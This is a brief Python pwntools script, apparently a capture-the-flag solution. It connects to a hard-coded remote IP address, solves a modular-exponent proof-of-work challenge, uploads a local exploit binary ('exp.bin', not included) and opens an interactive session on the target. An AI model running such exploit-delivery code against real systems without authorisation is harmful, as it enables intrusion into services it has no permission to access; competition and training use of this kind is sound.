from pwn import *

p = remote("111.231.174.57", "32617")

p.recvline()
req = p.recvline().decode()

exp = int(req.strip("2^(2^").split(")")[0])
mod = int(req.split(" mod ")[1].strip(" = ?\n"))

print(req)
print(f"exp: {exp}")
print(f"mod: {mod}")

ans = pow(2, exp)
ans = pow(2, ans, mod)
print(f"ans: {ans}")
p.sendline(f"{ans}".encode())

elf = open("exp.bin", "rb").read()
p.sendlineafter(b": ", f"{len(elf)+1}".encode())
p.sendlineafter(b":\n", elf)

p.interactive()